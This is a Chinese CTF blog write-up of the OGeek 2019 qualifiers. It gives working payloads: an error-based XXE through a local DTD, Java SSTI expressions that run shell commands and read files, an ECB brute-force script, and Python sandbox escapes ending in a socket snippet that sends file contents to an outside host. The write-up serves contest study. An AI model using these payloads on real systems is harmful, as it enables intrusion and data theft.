---
title: Ogeek CTF Quals 2019 Writeup
categories: CTF&AWD
tags:
  - writeup
abbrlink: 45148
date: 2019-08-26 01:38:28
---

## 写在之前

周末打了这个比赛,趟大佬的车,混到第六.如果不是我这么菜,有机会第四或第三的.

如此简单的web题都解不了,丢人(捂脸

感谢比赛过程中队内各位大佬给的各种提示.

以下writeup仅是我自己能解的题或参与解的题.

## WEB

### LookAround 

F12查看源码发现一个文件名奇怪的js,功能是定时发送请求.

请求内容比较奇怪,猜测就是考点,xxe了.

随便改了下xml,就发生500报错.

尝试了下常见的payload,猜测逻辑,如果xml合法则无返回,xml异常则500报错.

队内师傅提醒之下,找到关键点

![img](/1.png)

[exploiting-xxe-with-local-dtd-files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

文章里给的payload

![1566745929599](/2.png)

文件不存在,那就找一个linux系统默认存在的,直接去linux全局文件搜索

![1566746070866](/1566746039967.png)

找一个可以用的,报错xxe成功获取flag

最终payload如下

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % condition 'aaa)>
        aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

### render

随便测试了一下,发现[[9*9]]中的内容被执行了输出了49.

搭配题目名字render,SSTI没跑了.

网上搜索发现了几个可用的payload

<https://www.4hou.com/vulnerable/9779.html>

`[[${T(java.lang.System).getenv()}]]`

![1566747041625](/1566747041625.png)

执行命令:

`${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}`

但是没有回显,测试了`nc,curl,wget`都弹不出来.不熟悉java.

然后队内师傅提示,直接读文件.

`[[${new java.io.BufferedReader(new [java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("cat /flag").getInputStream())).readLine()}]]`

或

`[[${new java.io.BufferedReader(new [java.io.FileReader("/flag")).readLine()}]]`

### Easy Realworld Challenge 

比赛的时候没做出来,卡在FTP读文件,时间上差了一点,有机会第四,还是我太菜了.

题解明天再整

## Crypto

### babycry

常见套路,第一次爆破flag前7位需要手动改一下,懒得写一键脚本了.第七位到最后爆破的脚本如下:

```
from pwn import *
flagkey="1234567890qwertyuiopasdfghjklzxcvbnm{}-_"
flag=''

def conn ():
    global  r
    r = remote("139.9.222.76",19999)
    r.recv()

    #r.sendline("1"*pad)
    return r


def cut_text(text,lenth):
    textArr = re.findall('.{'+str(lenth)+'}', text)
    textArr.append(text[(len(textArr)*lenth):])
    return textArr

def get(conn,s):
	conn.sendline('des '+s)
	return cut_text(conn.recv(),16)[:-1]


def fuck():
	r = conn()
	f = 'flag{c0'
	for k in range(1,5):
		pad = 0

		for j in range(8):
			padding='0'*(8-pad)

			stand = get(r,padding)[k]
			for i in flagkey:
				stand2 = get(r,padding+f+i)[k]

				if stand == stand2:
					pad = pad + 1
					f = f + i
					print f
					break
			
fuck()
#flag{c0ngratul4tions_1_y0uve_chec7ed_1n_ogeek}


```

## MISC

### pybox

绕过思路和ciscn的一样,就是没回显

`__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('sleep 4')`

那就弹,又是`nv,curl,wget`都试一遍,无果

看提示,cut,sleep,那就是时间盲注了

` __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('sleep $(ca'+'t /home/flag|cut -c1|tr f 4)')`

但是tr被过滤了,尝试别的方法替换字符串.

```
__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')("export str=\`tac /home/flag\`;str=${str:0:1};str=${str/f/2} && sleep $str ")  
```

不知道为什么只有通配符能替换,ascii1-256都不行,无果

又是队内大佬提示

```shell
s=__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('socket').__getattribute__('socket')()
s.connect(('111.111.111.111', 11111))
p=__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('popen')('cut -c 1-64 flag')
s.send(p.read())
```

感觉这是非预期解了